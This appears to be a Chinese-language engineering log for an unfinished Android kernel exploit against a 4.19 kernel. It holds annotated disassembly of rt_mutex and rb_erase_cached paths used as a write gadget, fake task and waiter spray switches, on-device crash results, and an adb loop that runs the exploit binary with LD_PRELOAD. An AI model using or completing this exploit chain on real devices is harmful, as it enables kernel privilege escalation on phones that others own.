# T2' 实测记录：write gadget 摆错结构体成员（Leaf5 #38，2026-10-26）

设备：`Leaf5 e913138`，`4.19.157-perf-g77c132eccfab-dirty #38`，SELinux enforcing，shell uid 2000。
ELF：`leaf5/raw/slotb_38/vmlinux.elf`（本轮自建，121896 syms，与作者记录逐条互证）。

---

## 1. 静态：write gadget 到底在哪

`rt_mutex_adjust_prio_chain @ 0xffffff8008149eb0`（530 insn）里，真正能落 store 的只有一处：

```
+0x02f4  ldr  x8, [x21, #0x10]   ; x21 = waiter->lock, +0x10 = lock->waiters.rb_leftmost
+0x02f8  cbz  x8, +0x310         ; top_waiter == NULL -> 跳过
+0x0300  ldr  x8, [x8, #0x38]    ; top_waiter->lock
+0x0304  cmp  x8, x21
+0x0308  b.eq +0x314             ; 必须相等
+0x0314  ldr  x8, [x25]          ; x25 = waiter, x8 = tree_entry.__rb_parent_color
+0x0318  cmp  x8, x25            ; RB_EMPTY_NODE(waiter->tree_entry) ?
+0x031c  b.eq +0x334             ; 空 -> 跳过 erase
+0x0320  add  x1, x21, #8        ; root = &lock->waiters
+0x0324  mov  x0, x25            ; node = &waiter->tree_entry
+0x0328  bl   rb_erase_cached    ; ← 唯一写原语
+0x0330  str  x25, [x25]         ; RB_CLEAR_NODE
```

结论：`rt_mutex_dequeue()` 删的是 **`waiter->tree_entry`（+0x00）**，起点 `root = &lock->waiters`。
仓库 `put_p9_fops_waiter()` 把 rb craft 全部写在 `pi_tree_entry`（+0x18），
那条 erase 走的是 `rt_mutex_dequeue_pi(fake_task->pi_waiters)`，**不是这条路径**。
所以 `+0x0314 ldr x8,[x25]` 永远读到 `parent_color = 1`，
`cmp x8,x25` 不等 → `b.eq +0x334` → `rb_erase_cached` 一次都没被调用。

这不是"gadget 不可达"，是**地址填到了错误的 rb_node 成员**。

## 2. 入口判据（`rt_mutex_adjust_pi @ 0xffffff8008149e00`）

```
+0x0020  ldr  x8, [x19, #0x8d0]  ; task->pi_blocked_on
+0x0028  cbz  x8, +0x50          ; NULL -> unlock + ret，chain 不调用
+0x0030  ldr  w10, [x8, #0x40]   ; waiter->prio
+0x0034  cmp  w10, w9            ; w9 = task->prio
+0x0038  b.ne +0x5c              ; 不等 -> 进 chain
+0x003c  tbz  w9, #0x1f, +0x50   ; CFS 且 prio 相等 -> early-out
+0x0044  ldr  x10, [x8, #0x48]   ; waiter->deadline
+0x004c  b.ne +0x5c              ; deadline 不等 -> 进 chain
+0x005c  ldr  x21, [x8, #0x38]   ; orig_lock = waiter->lock（= pselect word7）
+0x0098  bl   rt_mutex_adjust_prio_chain(task, 0, NULL, waiter->lock, NULL, task)
```

两个 early-out 出口：`pi_blocked_on == NULL`，或 `prio/deadline 全等`。
`orig_lock` 直接取自 residual 的 `lock` 字段 —— 所以只要 chain 被调用，
`_raw_spin_trylock(lock=0x41)` 必然 page fault，这是最干净的到达判据。

## 3. 代码改动（`exploit/src/util.c`）

| 开关 | 作用 |
|---|---|
| `TREE_ENTRY_GADGET=1` | rgb craft 从 `pi_tree_entry` 移到 `tree_entry`(+0x00) |
| `FAKE_TASK_PI_WAITERS_SPRAY=1` | `fake_task->pi_waiters` 指向 `fake_w0+0x18`（chain 在 +0x98 判空退出） |
| `FAKE_TASK_BLOCKED_ON_SPRAY=1` | `fake_task->pi_blocked_on = fake_w0`，让 chain 全程跑在 spray 上 |

`rb_erase_cached` Case1-b（`rb_left≠0, rb_right=0`）语义：
1. `*(rb_left) = __rb_parent_color` ← 目标写
2. `parent = parent_color & ~3`，`__rb_change_child` 解引用 parent ← 第二步才崩

## 4. 实测矩阵（真机，非推测）

| # | 配置 | 结果 |
|---|---|---|
| A | `TREE_ENTRY_GADGET + 三开关 + WRITE_ORACLE=uts` | 存活，`hit=0`，8 轮 |
| B | `TREE_ENTRY_GADGET + 三开关 + PSELECT_PARENT_CRASH` | **kernel panic**（`ro.boot.bootreason=kernel_panic,null`） |
| E1 | `TREE_ENTRY_GADGET + PSELECT_PARENT_CRASH`（不动 fake_task） | 存活，`hit=0` |
| E2 | 三开关 + `PSELECT_PARENT_CRASH`（不动 tree_entry） | 存活，`hit=0` |
| E3 | 最小 `PSELECT_LOCK_CRASH=1`（lock=0x41） | **存活，`hit=0`，uptime 连续** |

`PSELECT_LOCK_CRASH=1` 是最关键的一条：仓库 `AARCH64_ANALYSIS_2026-07-26.md:16`
记录 `#245` 上是 **Kernel panic**，`#38` 上实测**完全无异常**。

结合 `rt_mutex_adjust_pi` 的入口判据，只有一个解释：
**chain 根本没被调用** —— `pi_blocked_on` 为 NULL，或 `prio/deadline` 全等 early-out。

## 5. 结论

1. GhostLock 在 `#38` 上的断点比仓库写的更靠前。仓库说卡在"写 gadget 不可达"，
   实际卡在 **consumer 入口**：`rt_mutex_adjust_pi` 连 chain 都没进。
2. `rb_erase_cached` 那 252 条指令是完整内联的，gadget 质量没问题；
   现在的问题是没有能触发它的 residual。
3. B 组的 panic 来自 `TREE_ENTRY_GADGET + 三开关` 组合下 fake_task 路径的某处解引用，
   与 `rb_erase` 无关（E1、E2 各自单独跑都存活）。

## 6. 未完成

`PSELECT_SHIFT_OVERRIDE` 扫描只跑了 `15 / 13` 两档（都存活），
脚本因单次超时中断。完整扫描（`-3 .. 23`）需要重跑：

```bash
for s in 15 13 17 11 19 9 21 7 23 5 -1 -3; do
  adb shell "cd /data/local/tmp/exploit/aarch64 && WRITE_ORACLE=uts \
    PSELECT_SHIFT_OVERRIDE=$s PSELECT_LOCK_CRASH=1 PI_CONSUMER=sched_setattr \
    LD_PRELOAD=./preload.so /system/bin/sleep 8"
  # 判据：进程异常退出 / uptime 重置 / adb 掉线
done
```

如果全扫完都不崩，说明 `pi_blocked_on` 确实为 NULL（`futex_requeue` 在
`start_proxy_lock` 失败时不 wake，WAIT 超时返回时清理已生效），
该链在 `#38` 上封档。
